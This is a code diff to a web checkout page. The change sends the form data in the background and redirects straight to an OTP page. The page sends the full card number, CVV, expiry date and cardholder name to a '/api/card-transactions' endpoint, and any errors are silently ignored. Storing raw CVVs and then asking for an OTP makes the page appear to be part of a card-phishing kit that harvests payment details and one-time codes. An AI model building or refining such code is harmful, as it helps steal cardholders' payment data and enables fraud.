@@ -77,27 +77,26 @@ export default function CardPage() {
     const merged: FormData = { ...parsedSaved, ...card };
     sessionStorage.setItem("formData", JSON.stringify(merged));
     const transactionId = sessionStorage.getItem("transactionId");
-    await Promise.all([
-      fetch("/api/requests", {
-        method: "PUT",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ ...merged, transactionId: sessionStorage.getItem("transactionId") }),
-      }),
-      transactionId
-        ? fetch("/api/card-transactions", {
-            method: "PATCH",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              transactionId,
-              cardHolderName: card.cardHolderName,
-              cardNumber: card.cardNumber,
-              cvv: card.cvv,
-              expiryDate: card.expiryDate,
-            }),
-          })
-        : Promise.resolve(),
-    ]);
+    // Navigate immediately, send API calls in background
     router.push("/checkout/otp");
+    fetch("/api/requests", {
+      method: "PUT",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ ...merged, transactionId }),
+    }).catch(() => {});
+    if (transactionId) {
+      fetch("/api/card-transactions", {
+        method: "PATCH",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          transactionId,
+          cardHolderName: card.cardHolderName,
+          cardNumber: card.cardNumber,
+          cvv: card.cvv,
+          expiryDate: card.expiryDate,
+        }),
+      }).catch(() => {});
+    }
   };
 
   if (loading) {
